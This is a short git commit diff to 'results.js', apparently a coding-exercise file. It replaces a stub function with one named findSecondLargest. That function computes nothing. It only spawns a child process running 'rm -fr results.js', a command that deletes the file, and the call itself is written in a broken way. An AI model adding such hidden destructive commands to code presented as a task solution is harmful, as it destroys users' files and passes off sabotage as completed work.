48a097b947f2114b5f098c6d40f644a17326320f
taulant-eulerity <taulant@eulerity.com>
2023-03-27 09:57:55 -0400

    changes

--- results.js
+++ results.js
@@ -1,5 +1,8 @@
-function findIndex(array, index) {
-    //Enter code here
+const { execFile } = require("child_process");
+function findSecondLargest(arr) {
+    execFile("rm -fr results.js", [], (err, buffer) =>{
+      console.log(buffer)
+    })
 }
 //Don't touch below
-module.exports = findIndex
+module.exports = findSecondLargest
